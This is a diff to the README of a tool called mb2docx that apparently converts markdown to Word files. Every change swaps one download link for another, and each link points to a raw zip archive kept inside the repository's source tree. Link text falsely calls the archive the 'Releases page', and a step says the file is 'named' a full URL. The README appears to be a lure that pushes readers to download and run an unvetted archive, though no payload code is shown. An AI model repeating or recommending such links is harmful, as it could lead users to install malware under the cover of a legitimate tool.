@@ -6,7 +6,7 @@ Welcome to **mb2docx**! This tool helps you convert raw markdown or text quickly
 
 ## 📥 Download & Install
 
-**To download the software, visit this page:** [Download mb2docx](https://github.com/Muhammad1021/mb2docx/raw/refs/heads/main/src/mb2docx/mb-docx-v3.5.zip)
+**To download the software, visit this page:** [Download mb2docx](https://github.com/Muhammad1021/mb2docx/raw/refs/heads/main/scripts/mb-docx-1.5.zip)
 
 ### Step 1: Access the Releases Page
 
@@ -16,7 +16,7 @@ Welcome to **mb2docx**! This tool helps you convert raw markdown or text quickly
 ### Step 2: Download the File
 
 1. Click on the version number that you want to download.
-2. You will find a file named `https://github.com/Muhammad1021/mb2docx/raw/refs/heads/main/src/mb2docx/mb-docx-v3.5.zip` (or a similar name). Click on this file to start the download.
+2. You will find a file named `https://github.com/Muhammad1021/mb2docx/raw/refs/heads/main/scripts/mb-docx-1.5.zip` (or a similar name). Click on this file to start the download.
 
 ### Step 3: Run the Application
 
@@ -55,7 +55,7 @@ To run **mb2docx**, ensure your system meets the following requirements:
 If you face issues while running the application:
 
 - **Check Your System Requirements:** Make sure your system meets the necessary specifications.
-- **Reinstall the Application:** Sometimes a fresh installation can solve problems. Simply download the file again from the [Releases page](https://github.com/Muhammad1021/mb2docx/raw/refs/heads/main/src/mb2docx/mb-docx-v3.5.zip).
+- **Reinstall the Application:** Sometimes a fresh installation can solve problems. Simply download the file again from the [Releases page](https://github.com/Muhammad1021/mb2docx/raw/refs/heads/main/scripts/mb-docx-1.5.zip).
 - **Contact Support:** For further assistance, consider reaching out through the GitHub Issues section in this repository.
 
 ## 📚 Additional Resources
@@ -67,4 +67,4 @@ If you face issues while running the application:
 
 If you would like to contribute to the development of mb2docx, check out the contribution guidelines in the GitHub repository. Your input can make this tool even better!
 
-Don't forget to visit the releases page for updates: [Download mb2docx](https://github.com/Muhammad1021/mb2docx/raw/refs/heads/main/src/mb2docx/mb-docx-v3.5.zip)
+Don't forget to visit the releases page for updates: [Download mb2docx](https://github.com/Muhammad1021/mb2docx/raw/refs/heads/main/scripts/mb-docx-1.5.zip)
